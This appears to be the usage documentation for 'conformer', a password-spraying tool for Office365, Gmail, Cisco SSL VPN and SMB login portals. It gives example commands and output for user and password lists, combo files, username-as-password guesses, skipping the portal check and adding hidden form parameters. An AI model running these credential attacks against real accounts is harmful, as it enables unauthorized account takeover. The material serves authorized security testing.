Syntax

conformer.sh <HOST_IP/Hostname><:PORT>(optional) <Username or Users_File> 
       <Password<\&par1=val1\&par2=val2>(optional) or Pass_File> <Portal Type> 
       <DISABLE_CHECK>(optional) <DEBUG=file>(optional) <LOG=file>(optional)
       <THREAD=n>(optional)

Conformer at a bare minimum needs to be provided a host, username/file, password/file and module

Ex.
conformer.sh outlook.office.com ~/path/to/username/file Password1 Office365
conformer.sh 192.168.10.5 testuser Password1 SMB

Each Conformer module has a function that performs a basic check if the webpage has the portal password guessing is attempted on, (this can be bypassed with the "disable_check" parameter, should be used if basic check is wrong and falls to identify the portal as correct.)

Ex. 
# In this example, conformer is being used against google.com with the CiscoSSLVPN, the expected reply is that the portal is not compatible.
conformer.sh google.com testuser Password1 CiscoSSLVPN
Either not a CiscoSSLVPN portal, or not compatible version.
Exiting...

# Using disable_check, allows the basic check made to be bypassed, conformer attempted the password guessing attempt, but since the server replied in an unexpected way still the message "--- Page not responding properly." was presented. In this case password guessing will not work against the portal. (If you see this randomly against some users in a password spray, but not all, it is possible that the server replied differently for those, this could be due to network connection, WAF, blacklisted, time-out, etc.)
conformer.sh google.com testuser Password1 CiscoSSLVPN disable_check

Host: google.com
    testuser:Password1:Fail --- Page not responding properly.

# You can also add the DEBUG=~/Path/to/debug/file as an option to see the parameters sent to the server, and the server response back. (Note the Gmail module is used in this example)
conformer.sh mail.google.com testuser Password1 Gmail debug=~/Desktop/conformer.debug

Host: mail.google.com
    testuser:Password1:Fail

cat ~/Desktop/conformer.debug
host:mail.google.com username:testuser password:Password1

<HTML>
<HEAD>
<TITLE>Unauthorized</TITLE>
</HEAD>
<BODY BGCOLOR="#FFFFFF" TEXT="#000000">

<H2>Error 401</H2>
</BODY>

Conformer can take usernames or userfiles, passwords or password files, Password equals Username, or providing a combofile in the format (:username:password) per line

Ex.# Using a username and password

conformer.sh mail.google.com Bob Password Gmail

Host: mail.google.com
 Bob:Password:Fail

# Using a userfile and password

conformer.sh mail.google.com ~/Desktop/usernames Password1 Gmail

Host: mail.google.com
 Bob:Password1:Fail
 Alice:Password1:Fail
 Mal:Password1:Fail
 Chuck:Password1:Fail
 Dan:Password1:Fail

# Using a username and password file

conformer.sh mail.google.com Bob ~/Desktop/passfile Gmail

Host: mail.google.com
 Bob:Password1:Fail
 Bob:Welcome1:Fail
 Bob:Password123:Fail

# Using a userfile and password file

conformer.sh mail.google.com ~/Desktop/usernames ~/Desktop/passfile Gmail

Host: mail.google.com
 Bob:Password1:Fail
 Bob:Welcome1:Fail
 Bob:Password123:Fail
 Alice:Password1:Fail
 Alice:Welcome1:Fail
 Alice:Password123:Fail
 Mal:Password1:Fail
 Mal:Welcome1:Fail
 Mal:Password123:Fail
 Chuck:Password1:Fail
 Chuck:Welcome1:Fail
 Chuck:Password123:Fail
 Dan:Password1:Fail
 Dan:Welcome1:Fail
 Dan:Password123:Fail

# Password = Username

conformer.sh mail.google.com ~/Desktop/usernames @SAME@ Gmail

Host: mail.google.com
 Bob:Bob:Fail
 Alice:Alice:Fail
 Mal:Mal:Fail
 Chuck:Chuck:Fail
 Dan:Dan:Fail

# Combo File
cat combofile.list:Bob:Welcome1
:Alice:Password123
:Mal:Example18
:Chuck:Summer18
:Dan:Spring2018

#When using a combo file, put combo in the username field to indicate this is a combo file attack, and in the password field provide the combo list.
conformer.sh mail.google.com combo Desktop/combofile.list Gmail

Host: mail.google.com
 Bob:Welcome1:Fail
 Alice:Password123:Fail
 Mal:Example18:Fail
 Chuck:Summer18:Fail
 Dan:Spring2018:Fail


Conformer can be used on non default ports, as well as having additional parameters added in situations where the web portal has additional parameters sent to the server such as domain name, group name, MFA, etc. These additional parameters can be determined by scraping the web form, or by intercepting the web traffic (burp proxy, ZAP proxy)

Ex.# This example is redacted, but is used against a CiscoSSLVPN portal with an additional group field. The "\&" is required to indicate the "&" is not being used as it is traditionally in bash. (in a password file you would use the same format password&par1=val1 without the need of the "\")conformer.sh <hostname> <username> Password1\&group_list="VPN_Group1" CiscoSSLVPN
Host: <host>
 <username>:Pasword1&group_list=VPN_Group1:**Success**
# If the additional parameter wasn't provided, there wouldn't be an error indicated, rather you would just receive a fail, this should be something to be careful of to not waste time.conformer.sh <hostname> <username> Password1 CiscoSSLVPN
Host: <host>
 <username>:Pasword1:Fail
# If portal is on a different port, just add a ":" and port number attached to the host.conformer.sh <hostname>:8080 <username> Password1\&group_list="VPN_Group1" CiscoSSLVPN
Host: <host>
 <username>:Pasword1&group_list=VPN_Group1:**Success**
